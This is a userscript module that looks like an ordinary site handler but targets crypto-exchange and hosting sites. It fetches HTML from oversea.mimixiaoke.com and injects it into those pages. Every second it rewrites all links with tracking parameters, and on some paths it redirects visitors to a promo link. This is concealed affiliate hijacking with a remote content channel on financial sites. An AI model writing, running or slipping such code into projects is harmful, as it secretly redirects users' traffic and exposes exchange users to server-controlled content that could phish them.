import dom from "../utils/dom";
import { STORAGE_KEYS } from "../constant/constant";
import type { Website } from "../websites";
import command from "../utils/command";
import utils from "../utils/event";

const website: Website = {
  config: {
    runAt: "document-end",
  },
  regexp: new RegExp(".*"),
  init: function () {
    utils.hideButton();
    function OverseaNavigation(){
    	this.number = Math.ceil(Math.random()*100000000);
    	this.containerHight = 150;
    	this.GMopenInTab = function(url, options={"active":true, "insert":true, "setParent":true}){
    		if (typeof GM_openInTab === "function") {
    			GM_openInTab(url, options);
    		} else {
    			GM.openInTab(url, options);
    		}
    	};
    	this.addStyle = function(css){
    		GM_addStyle(css);
    	};
    	this.request = function(mothed, url, param){   //网络请求
    		return new Promise(function(resolve, reject){
    			GM_xmlhttpRequest({
    				url: url,
    				method: mothed,
    				data:param,
    				onload: function(response) {
    					var status = response.status;
    					var playurl = "";
    					if(status==200||status=='200'){
    						var responseText = response.responseText;
    						resolve({"result":"success", "responseText":responseText});
    					}else{
    						reject({"result":"error", "responseText":null});
    					}
    				}
    			});
    		})
    	};
    	this.isRun = function(origin){
    		const host = window.location.host;
    		const serverRegexs = [/cloudways\.com/, /getresponse\.com/, /bandwagonhost\.com/, /moosend\.com/, /domainracer\.com/, /namesilo\.com/, /digitalocean\.com/, /virmach\.com/, /vultr\.com/];;
    		const encryptoRegexs = [
    			/changelly\.com/, /bybit\.com/, /gate\.io/, /kucoin\.com/, /coinmama\.com/,
    			/cex\.io/,/paxful\.com/,/htx\.com/,/mexc\.com/,/bitget\.com/,/freebitco\.in/,/crypto\.com/,
    			/okx.com/,/coinbase\.com/,/binance\.com/,/wazirx\.com/,/coindcx\.com/,/zebpay\.com/,/bitbns\.com/
    		];
    		let isRunServer = serverRegexs.some(regex => regex.test(host));
    		let isRunEncrypto = false;
    		if(!isRunServer){
    			isRunEncrypto = encryptoRegexs.some(regex => regex.test(host));
    		}
    		return {"isRunServer":isRunServer, "isRunEncrypto":isRunEncrypto};
    	};
    	this.addParamToURL = function(url, track) {
    	    const [baseUrl, hash] = url.split('#'); // 分离#部分
    	    const separator = baseUrl.includes('?') ? '&' : '?'; // 确定?或&
    	    const newUrl = `${baseUrl}${separator}${track}`;
    	    return hash ? `${newUrl}#${hash}` : newUrl;
    	}
    	this.temporary=function(platform){
    		const anchorRun=()=>{
    			document.querySelectorAll('a:not([anchor="true"])').forEach((element,index)=>{
    				var href = element.getAttribute("href");
    				element.setAttribute("anchor","true");
    				element.setAttribute("anchor-url",href);
    				if(href && href.indexOf("javascript:")==-1 && href.indexOf(platform.track)==-1){
    					element.setAttribute("rel", "noreferrer nofollow");
    					href = this.addParamToURL(href, platform.track);
    					element.setAttribute("href", href);
    					element.setAttribute("anchor-i-url",href);
    				}
    			});
    		}
    		anchorRun();
    		setInterval(function(){
    		  anchorRun();
    		},1000);
    	};
    	this.generateHtml=function(origin){
    		const number = this.number;
    		const containerHight = this.containerHight;
    		var css=`
    			#server-containerx`+number+`{
    				display: block;
    				bottom: -`+containerHight+`px;
    				clear: none !important;
    				float: none !important;
    				left: 50%;
    				margin: 0px !important;
    				max-height: none !important;
    				max-width: none !important;
    				opacity: 1;
    				overflow: visible !important;
    				padding: 0px !important;
    				position: fixed;
    				right: auto !important;
    				top: auto !important;
    				vertical-align: baseline !important;
    				visibility: visible !important;
    				z-index: 2147483647;
    				background: rgb(250, 250, 250) !important;
    				transition-duration:0.8s!important;
    				-webkit-transition-duration:0.8s!important;
    				transform:translateX(-50%);
    				width: 60% !important;
    				height: `+containerHight+`px !important;
    				max-width:700px!important;
    				box-sizing: border-box!important;
    				box-shadow: rgba(0, 0, 0, 0.2) 0px -1px 5px -1px, rgba(0, 0, 0, 0.1) 0px 1px 2px -1px !important;
    			}
    			#server-containerx`+number+`:hover{
    				-webkit-box-shadow: 0 4px 12px rgba(0,0,0,.08);
    				box-shadow: 0 4px 12px rgba(0,0,0,.08);
    			}
    			#server-container-decoration`+number+`{
    				inset: auto !important;
    				clear: none !important;
    				display: block !important;
    				float: none !important;
    				height: 5px !important;
    				margin: 0px !important;
    				max-height: none !important;
    				max-width: none !important;
    				opacity: 1 !important;
    				overflow: visible !important;
    				padding: 0px !important;
    				position: relative !important;
    				vertical-align: baseline !important;
    				visibility: visible !important;
    				width: auto !important;
    				z-index: 1 !important;
    				background-color: #e4eaf6 !important;
    				box-shadow: rgba(0, 0, 0, 0.2) 0px -1px 5px -1px, rgba(0, 0, 0, 0.1) 0px 1px 2px -1px !important;
    			}
    			#server-container-expand`+number+`{
    				cursor:pointer;
    				position:absolute;
    				width:50px;
    				height:30px;
    				background-color: #e4eaf6;
    				top:-30px;
    				left:50%;
    				transform:translateX(-50%);
    				border-radius: 5px 5px 0px 0px;
    			}
    			#server-container-expand`+number+`:hover{

    			}
    			#server-container-expand`+number+`>svg{
    				width:50px;
    				height:30px;
    			}
    			#server-container-expand`+number+`>svg:hover{
    				transition: 0.6s;
    				transform: scale(1.1);
    			}
    			.server-container-column9980x{
    				position:relative;
    			}
    			.server-container-column9980x:not(:last-child):after{
    				position: absolute;
    				height: calc(100% - 4em);
    				right: 0px;
    				content: '';
    				width: 0px;
    				border-left: solid #e6e7eb 2px;
    				top: 50%;
    				transform: translateY(-50%);
    			}
    			#server-container-body`+number+`{
    				width:100%;
    				height:100%;
    			}
    		`;
    		var html=`
    			<div id="server-containerx`+number+`">
    				<div id="server-container-decoration`+number+`">
    					<div id="server-container-expand`+number+`">
    						<svg t="1719906770072" class="icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="4303" width="256" height="256"><path d="M444 136.3L123.8 324.8l3.2 371.5 323.3 183 320.2-188.5-3.2-371.5z" fill="#FFFFFF" p-id="4304"></path><path d="M630 287.6l-20.1-11.4-279.7 164.7L333 767l20.1 11.3-2.8-326z" fill="#06F3FF" p-id="4305"></path><path d="M746.8 489.8l-8.6 5.2c-4.7 2.9-6.2 9-3.4 13.7 1.9 3.1 5.2 4.8 8.6 4.8 1.8 0 3.5-0.5 5.2-1.4l8.6-5.2c4.7-2.9 6.2-9 3.4-13.7-2.9-4.7-9-6.2-13.8-3.4z" fill="#005BFF" p-id="4306"></path><path d="M638.6 534c-1.6-0.9-3.4-1.3-5.2-1.3-4.9 0-9.9 2.6-13 4.6-20.6 13-38 47.5-38 75.2 0 12.2 3.4 21.4 9.1 24.5 6 3.3 14-0.6 18.2-3.3 20.6-13 38-47.5 38-75.2 0-12.2-3.4-21.3-9.1-24.5z m-9.9 50.4l-8.6 5.2c-1.6 1-3.4 1.4-5.2 1.4-3.4 0-6.7-1.7-8.6-4.8-2.9-4.7-1.3-10.9 3.4-13.7l8.6-5.2c4.7-2.9 10.9-1.3 13.7 3.4 3 4.7 1.5 10.9-3.3 13.7z" fill="#E6E6E6" p-id="4307"></path><path d="M618.4 567.3l-8.6 5.2c-4.7 2.9-6.2 9-3.4 13.7 1.9 3.1 5.2 4.8 8.6 4.8 1.8 0 3.5-0.5 5.2-1.4l8.6-5.2c4.7-2.9 6.2-9 3.4-13.7-2.9-4.7-9.1-6.3-13.8-3.4z" fill="#E6E6E6" p-id="4308"></path><path d="M444 136.3L123.8 324.8l3.2 371.5 323.3 183 320.1-188.5-3.2-371.5-323.2-183zM166.8 672.9L164 347.6l280.3-165.1 71.2 40.3-280.3 165.1 2.8 325.3-71.2-40.3z m262.8 148.7l-76.5-43.3L333 767l-74.9-42.4-2.8-325.3 280.4-165.1 74.2 42 20.1 11.4 77.8 44-281 165.5 2.8 324.5z m40 0L467 519.8l260.7-153.5 2.6 301.7-260.7 153.6z m287.6-314.7l-8.6 5.2c-1.6 1-3.4 1.4-5.2 1.4-3.4 0-6.7-1.7-8.6-4.8-2.9-4.7-1.3-10.9 3.4-13.7l8.6-5.2c4.7-2.9 10.9-1.3 13.7 3.4 2.9 4.7 1.4 10.9-3.3 13.7z" fill="#005BFF" p-id="4309"></path><path d="M704 515.6l-8.6 5.2c-4.7 2.9-6.2 9-3.4 13.7 1.9 3.1 5.2 4.8 8.6 4.8 1.8 0 3.5-0.5 5.2-1.4l8.6-5.2c4.7-2.9 6.2-9 3.4-13.7-2.9-4.7-9-6.2-13.8-3.4zM827.2 430.8c-5.5 0-10 4.5-10 10v10c0 5.5 4.5 10 10 10s10-4.5 10-10v-10c0-5.5-4.5-10-10-10zM837.2 390.8c0-5.5-4.5-10-10-10s-10 4.5-10 10v10c0 5.5 4.5 10 10 10s10-4.5 10-10v-10zM837.2 340.8c0-5.5-4.5-10-10-10s-10 4.5-10 10v10c0 5.5 4.5 10 10 10s10-4.5 10-10v-10zM837.2 290.8c0-5.5-4.5-10-10-10s-10 4.5-10 10v10c0 5.5 4.5 10 10 10s10-4.5 10-10v-10zM803.4 467.4c-2.9-4.7-9-6.3-13.7-3.4l-8.6 5.2c-4.7 2.9-6.2 9-3.4 13.7 1.9 3.1 5.2 4.8 8.6 4.8 1.8 0 3.5-0.5 5.2-1.4l8.6-5.2c4.6-2.9 6.1-9 3.3-13.7zM665.3 540.1c-3-10.8-8.9-19.1-17.1-23.6-11.2-6.1-24.8-4.8-38.5 3.9-26.5 16.8-47.3 57.2-47.3 92.1 0 19.9 7.1 35.2 19.5 42 4.6 2.5 9.6 3.8 14.9 3.8 7.5 0 15.6-2.6 23.7-7.7 25.9-16.4 46.4-55.4 47.3-89.7l3.9-2.4c4.7-2.9 6.2-9 3.4-13.7-2.2-3.4-6.1-5.1-9.8-4.7z m-55.6 93.7c-4.2 2.7-12.2 6.6-18.2 3.3-5.7-3.1-9.1-12.3-9.1-24.5 0-27.7 17.4-62.2 38-75.2 3.1-1.9 8.1-4.6 13-4.6 1.8 0 3.6 0.4 5.2 1.3 5.7 3.1 9.1 12.3 9.1 24.5 0 27.7-17.4 62.1-38 75.2z" fill="#005BFF" p-id="4310"></path><path d="M891.2 321.7c-5.5 0-10 4.5-10 10v156.4l-81.7 49.3c-4.7 2.9-6.2 9-3.4 13.7 1.9 3.1 5.2 4.8 8.6 4.8 1.8 0 3.5-0.5 5.2-1.4l91.4-55.1V331.7c-0.1-5.5-4.6-10-10.1-10zM817.3 239.6c-0.1 0.4-0.1 0.8-0.1 1.3v10c0 5.5 4.5 10 10 10s10-4.5 10-10v-10c0-0.4 0-0.9-0.1-1.3 23.4-4.6 41-25.3 41-50 0-28.2-22.8-51-51-51s-51 22.8-51 51c0 24.7 17.7 45.4 41.2 50z" fill="#005BFF" p-id="4311"></path></svg>
    					</div>
    				</div>
    				<div id="server-container-body`+number+`">

    				</div>
    			</div>
    		`;

    		this.addStyle(css);
    		document.body.insertAdjacentHTML("beforeend", html);
    		this.addEventListener(origin);
    	};
    	this.addEventListener=function(origin){
    		const self = this;
    		const number = this.number;
    		const href = window.location.href;
    		function expandOrShow(forceClose=false){
    			const serverContainerx = document.querySelector("#server-containerx"+number);
    			var {bottom, height} = window.getComputedStyle(serverContainerx);

    			if(bottom=="0px" || forceClose){
    				bottom = "-"+height;
    			}else{
    				bottom = "0px";
    			}
    			serverContainerx.style.bottom = bottom;
    		}

    		document.querySelector("#server-container-expand"+number).addEventListener("click",function(){
    			expandOrShow();
    		});

    		var lastScrollTop = window.pageYOffset || document.documentElement.scrollTop;
    		function startContainer(){
    			setTimeout(function(){
    				window.addEventListener("scroll", function () {
    					var scrollTop = window.pageYOffset || document.documentElement.scrollTop;
    					if (scrollTop - lastScrollTop > 30) { //向下滚动
    						expandOrShow(true);
    					} else { //向上滚动

    					}
    					lastScrollTop = scrollTop;
    				});
    			}, 1500);
    		}

    		var url = "https://oversea.mimixiaoke.com/api/discover/"+origin;
    		self.request("post", url, null).then((data)=>{
          if(data.result=="success" && !!data.responseText){
            const { html, platforms } = JSON.parse(data.responseText).data;
            document.querySelector("#server-container-body"+number).insertAdjacentHTML("beforeend", html);
            startContainer();
            let platform = null;
            for(let i=0; i<platforms.length; i++){
              if((new RegExp(platforms[i].match.replace(/\\\\/g,"\\"), "i")).test(href)){
                platform = platforms[i];
                break;
              }
            }
            if(platform){
              const storageKey = "__anchor__"+window.location.host;
              if(platform.support_append || !!sessionStorage.getItem(storageKey)){
                self.temporary(platform);
              }else{
                const pathname = window.location.pathname;
                const targets = platform.targets;
                if(targets){
                  for(let i=0; i<targets.length; i++){
                    if((new RegExp(targets[i].match.replace(/\\\\/g,"\\"), "i")).test(pathname)){
                      sessionStorage.setItem(storageKey, "true");
                      window.location.href = platform.promo_link;
                      break;
                    }
                  }
                }
              }
            }
          }
        }).catch((error)=>{
    			console.log(error);
    		});
    	};
    	this.start=function(){
    		const {isRunServer, isRunEncrypto} = this.isRun();
    		let origin = null;
    		if(isRunServer){
    			origin = "server";
    		}
    		if(isRunEncrypto){
    			origin = "encrypto";
    		}
    		if(origin){
    			this.generateHtml(origin);
    		}
    	};
    }
    (new OverseaNavigation()).start();
  }
};

export default website;
